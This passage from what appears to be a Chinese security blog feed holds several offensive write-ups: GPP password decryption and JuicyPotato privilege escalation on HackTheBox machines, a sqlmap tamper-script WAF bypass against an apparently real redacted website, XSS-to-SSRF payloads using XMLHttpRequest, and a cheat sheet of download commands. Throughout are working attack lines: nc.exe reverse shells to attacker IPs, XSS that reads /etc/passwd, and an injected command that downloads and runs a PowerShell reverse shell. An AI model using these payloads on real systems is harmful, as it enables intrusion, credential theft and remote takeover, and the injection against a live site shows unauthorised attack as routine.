userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;</code></pre><p><strong>4、解密</strong><br>使用<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">gpprefdecrypt.py</a>： </p><pre><code>python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在SYSVOL查找密码组策略首选项（GPP）中的密码&lt;/p&gt;
&lt;h1 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是GPP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;G
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JuicyPotato提权</title>
    <link href="https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"/>
    <id>https://github.com/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-22T06:52:56.000Z</published>
    <updated>2020-04-22T12:05:27.105Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ohpe/juicy-potato/">https://github.com/ohpe/juicy-potato/</a></p><h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广</p><p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p><p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p><p><img src="/images/1.png" alt=""></p><p><img src="2.png" alt=""></p><h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p><p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p><p><strong>自定义COM监听端口</strong></p><p>-l <port>: COM server listen port</p><p><strong>COM监听地址</strong></p><p>-m <ip>: COM server listen address (default 127.0.0.1)</p><p><strong>进程创建模块</strong> </p><p>-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, &lt;*&gt; try both</p><p><strong>执行指定进程或脚本</strong></p><p>-p <program>: program to launch</p><p><strong>为指定的执行进程选择参数</strong></p><p>-a <argument>: command line argument to pass to program (default NULL)</p><p><strong>RPC服务地址</strong></p><p>-k <ip>: RPC server ip address (default 127.0.0.1)</p><p><strong>RPC服务端口：</strong></p><p>-n <port>: RPC server listen port (default 135)</p><p><strong>支持测试模块；测试并查找clsid</strong></p><p>-z only test CLSID and print token’s user</p><h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="2.png" alt=""></p><p><img src="/images/2.png" alt=""></p><h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p><pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><h1 id="0x04、CLSID快速验证"><a href="#0x04、CLSID快速验证" class="headerlink" title="0x04、CLSID快速验证"></a>0x04、CLSID快速验证</h1><p><strong>[1]获取可用CLSID列表</strong></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">提取CLSID Powershell脚本 GetCLSID.ps1</a></p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">同级目录下需要有Join-Object.ps1</a></p><p>GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)</p><pre><code>Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1powershell -ep bypass -f GetCLSID.ps1##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -</code></pre><p><strong>枚举所有满足条件的CLSID:</strong></p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}foreach($a in $CLSID){Write-Host $a.CLSID}</code></pre><p>[2]批处理调用juicypotato.exe逐个测试CLSID</p><p>test_clsid.bat:</p><pre><code>@echo off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><h1 id="0x05、限制条件"><a href="#0x05、限制条件" class="headerlink" title="0x05、限制条件"></a>0x05、限制条件</h1><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ohpe/juicy-potato/&quot;&gt;https://github.com/ohpe/juicy-potato/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x01、前言&quot;&gt;&lt;a href=&quot;#0x01、前言&quot; cl
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一次注入实战引发的SQLMAP修改之路</title>
    <link href="https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"/>
    <id>https://github.com/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/</id>
    <published>2020-04-19T15:54:24.000Z</published>
    <updated>2020-04-25T14:48:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>首发于先知社区：<a href="https://xz.aliyun.com/t/6864" target="_blank" rel="noopener">https://xz.aliyun.com/t/6864</a></p><p>#一、    前言<br>SQLmap的payload修改一般有两种方式:<br>  1、编写tamper<br>  2、修改/添加sqlmap的xml文件语句自定义payload</p><p>#二、    注入点Fuzz<br>选中目标网站：<a href="http://www.xxxx.com/journals_desc.php?id=40" target="_blank" rel="noopener">http://www.xxxx.com/journals_desc.php?id=40</a><br>单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150651-a71aa4bc-11ad-1.png" alt="image.png"></p><p>Order by 猜字段值为7</p><p>Waf为Modsec，直接使用union select被拦截：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150707-b0415338-11ad-1.png" alt="image.png"></p><p>Fuzz：</p><pre><code>单个union    #不拦截单个select    #不拦截Union select  #拦截union /**/ select #拦截/*!00000union*/ select #内联注释，不拦截/*!50000union*/ select 1,2,3,4,5,6,7 </code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150725-baf1a594-11ad-1.png" alt="image.png"></p><p>此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型<br>解决方法：<br>[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通</p><p>[2]采用报错注入</p><p>#三、编写简单Tamper脚本绕过<br>（使用自带的modsecurityzeroversioned.py不能绕过）</p><p>报错注入过程中，发现主要过滤关键词from和函数concat（）</p><p>1、concat()被过滤:<code>concat()--&gt;concat/**/()</code>  对应tamper脚本concat2concatcomment.py如下：</p><pre><code>#!/usr/bin/env python2&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():passdef tamper(payload, **kwargs):return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)</code></pre><p>2、from被过滤，<code>from</code>–&gt;<code>/*!44144from*/</code>对应tamper脚本from.py如下：</p><pre><code>#!/usr/bin/env python2&quot;&quot;&quot;Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file &apos;LICENSE&apos; for copying permission&quot;&quot;&quot;from lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():passdef tamper(payload, **kwargs):return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)</code></pre><p>验证：</p><pre><code>python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191203115117-291b7916-1580-1.png" alt="QQ图片20191203115040.png"></p><p><code>--dbs</code>读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）<br>payload in sqlmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191203114925-e65a320c-157f-1.png" alt="QQ图片20191203114836.png"></p><p><code>--tables</code>读取，很遗憾，读取失败</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150750-ca51e544-11ad-1.png" alt="image.png"></p><p>再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？</p><p>但是，，，，坑的是竟然不是因为过滤引起的？？？？</p><p>#四、修改SQLmap的xml文件语句<br>实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？<br>再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。<br>大家自行比较一下下面这两条语句看看能不能看出问题~<br>1、</p><pre><code>https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)</code></pre><p>2、</p><pre><code>https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)</code></pre><p>下面讲几个概念</p><p>[1]table和colums在mysql中是特殊字符</p><p>[2]反引号是sql语言的转义字符</p><p>[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号 <code></code> ，（但在指定其他数据库时不能加，否则会被认作是表）</p><p>我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml</p><pre><code>information_schema.tables --&gt; information_schema.`tables`</code></pre><p>当然，columns也需要修改</p><pre><code>information_schema.columns --&gt; information_schema.`columns`</code></pre><p>修改之后跑表：</p><pre><code>python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tables</code></pre><p>payload in sqlamp（比对一下payload，看看效果）:</p><pre><code>66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150800-d00c86a6-11ad-1.png" alt="image.png"></p><p>跑列值也是一样的，就不多说了，直接上图</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150805-d34505f0-11ad-1.png" alt="image.png"></p><p>#五、关于SQLmap自定义payload的一些思考<br>SQLmap的payload修改，其实并不复杂。</p><p>tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考<a href="https://payloads.online/archivers/2017-06-08/1" target="_blank" rel="noopener">https://payloads.online/archivers/2017-06-08/1</a></p><p>修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。<br>    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.<code>TABLES</code>的修改<br>不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191128150815-d8ab5148-11ad-1.png" alt="image.png"></p><p>假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/6864&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6864&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;#一、    前言&lt;br&gt;SQLmap
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从两道靶场题目看XHR</title>
    <link href="https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"/>
    <id>https://github.com/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/</id>
    <published>2020-04-19T15:51:48.000Z</published>
    <updated>2020-04-19T15:53:35.592Z</updated>
    
    <content type="html"><![CDATA[<p>首发于先知社区：<a href="https://xz.aliyun.com/t/7473/" target="_blank" rel="noopener">https://xz.aliyun.com/t/7473/</a></p><p>#0x01、什么是XHR<br>XHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。</p><p>特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至<strong>支持 HTTP 以外的协议（包括 file:// 和 FTP）</strong></p><p>#0x02、利用一：读取本地文件</p><p>适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）</p><p>以Hackthebox的book靶场为例：</p><p><strong>情景描述</strong>：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145435-7d10b84a-6e65-1.png" alt="image.png"></p><p><strong>验证</strong>：Title字段插入内容更改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="built_in">Date</span>());</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145448-84b5f1fa-6e65-1.png" alt="image.png"></p><p><strong>进一步利用</strong>：利用XHR读取本地文件</p><p>本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;</p><pre><code>&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145504-8e7ebc80-6e65-1.png" alt="image.png"></p><p>没有回显</p><pre><code>&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;</code></pre><p>还是没有回显</p><p>姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：</p><pre><code>&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send(); &lt;/script&gt;</code></pre><p>Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145528-9c598164-6e65-1.png" alt="image.png"></p><p>同样的方法可以直接读取到该服务器的用户ssh私钥进行登录</p><p>#0x03、利用二：由XSS到SSRF之命令执行</p><p>这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例</p><p><strong>情景描述</strong>：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145537-a1ac7bbc-6e65-1.png" alt="image.png"></p><p><strong>简易思路</strong>:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制</p><p><strong>漏洞利用</strong>：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）<br>Payload：</p><pre><code>&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;</code></pre><p>nc -lvvp 9999 即可回弹shell</p><p>#0x04、一点小小扩展<br>这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。<br>这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：<br>XSS框直接插入：<br>    <script src="http://10.10.16.21:8000/reverse.js"></script></p><p>Reverse.js文件内容如下：</p><pre><code>function paintfunc(){ var http = new XMLHttpRequest();     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;     http.open(&apos;POST&apos;, url, true);     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);     http.send(params);}paintfunc();</code></pre><p>#0x05、题后话<br>1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等</p><p>2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：<br>创建iframe.html,写入如下语句</p><pre><code>&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;</code></pre><p>直接在本地直接打开</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145556-ad00484a-6e65-1.png" alt="image.png"></p><p>放到网站目录下通过浏览器访问：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200325145602-b0b7d6d8-6e65-1.png" alt="image.png"></p><p>链接：</p><p><a href="https://www.w3schools.com/xml/xml_http.asp" target="_blank" rel="noopener">https://www.w3schools.com/xml/xml_http.asp</a> </p><p><a href="http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/</a></p><p><a href="https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/" target="_blank" rel="noopener">https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7473/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7473/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;#0x01、什么是XHR&lt;br&gt;X
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>multi-ways-file-download</title>
    <link href="https://github.com/2020/04/19/multi-ways-file-download/"/>
    <id>https://github.com/2020/04/19/multi-ways-file-download/</id>
    <published>2020-04-19T13:32:17.000Z</published>
    <updated>2020-04-19T13:32:58.437Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这里我分为三个模块：Linux、Windows、常见语言环境</strong></p><p>#Linux#</p><h1 id="1、curl"><a href="#1、curl" class="headerlink" title="1、curl"></a>1、curl</h1><pre><code>curl -O http://xx.xx.xx.xx/filename curl http://xx.xx.xx.xx/filename  -o path/filename</code></pre><h1 id="2、wget"><a href="#2、wget" class="headerlink" title="2、wget"></a>2、wget</h1><pre><code>wget http://xx.xx.xx.xx/filename  [-o path/filename]</code></pre><h1 id="3、nc"><a href="#3、nc" class="headerlink" title="3、nc"></a>3、nc</h1><h2 id="3-1、发送方主动连接目标机器"><a href="#3-1、发送方主动连接目标机器" class="headerlink" title="3.1、发送方主动连接目标机器"></a>3.1、发送方主动连接目标机器</h2><p>接收方先执行命令</p><pre><code>发送方：nc -w 3 [destination] 1234 &lt; out.file接收方:nc -l -p 1234 &gt; out.file</code></pre><h2 id="3-2、目标机器主动连接发送方"><a href="#3-2、目标机器主动连接发送方" class="headerlink" title="3.2、目标机器主动连接发送方"></a>3.2、目标机器主动连接发送方</h2><pre><code>cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件nc  launcher_ip 1234 &gt; file  ####接收方</code></pre><h1 id="4、利用linux自带base64命令"><a href="#4、利用linux自带base64命令" class="headerlink" title="4、利用linux自带base64命令"></a>4、利用linux自带base64命令</h1><p>本地将(可执行)文件转换为base64</p><pre><code>python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;</code></pre><p>目标机器执行：</p><pre><code>echo &quot;strings&quot; | base64 -d &gt; out.file</code></pre><h1 id="5、SCP"><a href="#5、SCP" class="headerlink" title="5、SCP"></a>5、SCP</h1><pre><code>scp username@servername:/path/filename /tmp/local_destination</code></pre><p>当然，windows有ssh的也可以使用，只是Linux一般比较多</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h1 id="1、Powershell"><a href="#1、Powershell" class="headerlink" title="1、Powershell"></a>1、Powershell</h1><h2 id="1-1、IEX调用WebClient"><a href="#1-1、IEX调用WebClient" class="headerlink" title="1.1、IEX调用WebClient"></a>1.1、IEX调用WebClient</h2><p>[1]</p><pre><code>IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载</code></pre><p>[2]    </p><pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行</code></pre><h2 id="1-2、WebRequest下载："><a href="#1-2、WebRequest下载：" class="headerlink" title="1.2、WebRequest下载："></a>1.2、WebRequest下载：</h2><pre><code>Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell</code></pre><h2 id="1-3、BitsTransfer"><a href="#1-3、BitsTransfer" class="headerlink" title="1.3、BitsTransfer"></a>1.3、BitsTransfer</h2><pre><code>Start-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell</code></pre><h1 id="2、SMB"><a href="#2、SMB" class="headerlink" title="2、SMB"></a>2、SMB</h1><h2 id="2-1、powershell"><a href="#2-1、powershell" class="headerlink" title="2.1、powershell"></a>2.1、powershell</h2><pre><code>Copy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\</code></pre><h2 id="2-2、CMD"><a href="#2-2、CMD" class="headerlink" title="2.2、CMD"></a>2.2、CMD</h2><pre><code>copy \\10.10.101.222\share\xxx.exe</code></pre><p>或者</p><pre><code>Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=17657</code></pre><h1 id="3、CURL"><a href="#3、CURL" class="headerlink" title="3、CURL"></a>3、CURL</h1><p>高版本windows自带</p><pre><code>curl -O  http://10.10.101.222:8000/xxx.execulr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe </code></pre><h1 id="4、FTP"><a href="#4、FTP" class="headerlink" title="4、FTP"></a>4、FTP</h1><pre><code>echo open 10.10.101.222 21&gt; ftp.txtecho ftp&gt;&gt; ftp.txtecho bin &gt;&gt; ftp.txtecho ftp&gt;&gt; ftp.txtecho GET xxx.exe &gt;&gt; ftp.txtftp -s:ftp.txt</code></pre><p>或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename<br>（linux开启ftp同样适用）</p><h1 id="5、VBS"><a href="#5、VBS" class="headerlink" title="5、VBS"></a>5、VBS</h1><h2 id="5-1、-vbs文件内容"><a href="#5-1、-vbs文件内容" class="headerlink" title="5.1、.vbs文件内容"></a>5.1、.vbs文件内容</h2><pre><code>Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set Shell = CreateObject(&quot;Wscript.Shell&quot;)Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0Post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,2</code></pre><h2 id="5-2、CMD下执行"><a href="#5-2、CMD下执行" class="headerlink" title="5.2、CMD下执行"></a>5.2、CMD下执行</h2><pre><code>echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbsecho Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbsecho Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbsecho Post.Send() &gt;&gt;download.vbsecho Set aGet = CreateObject(&quot;ADODB.Stream&quot;) 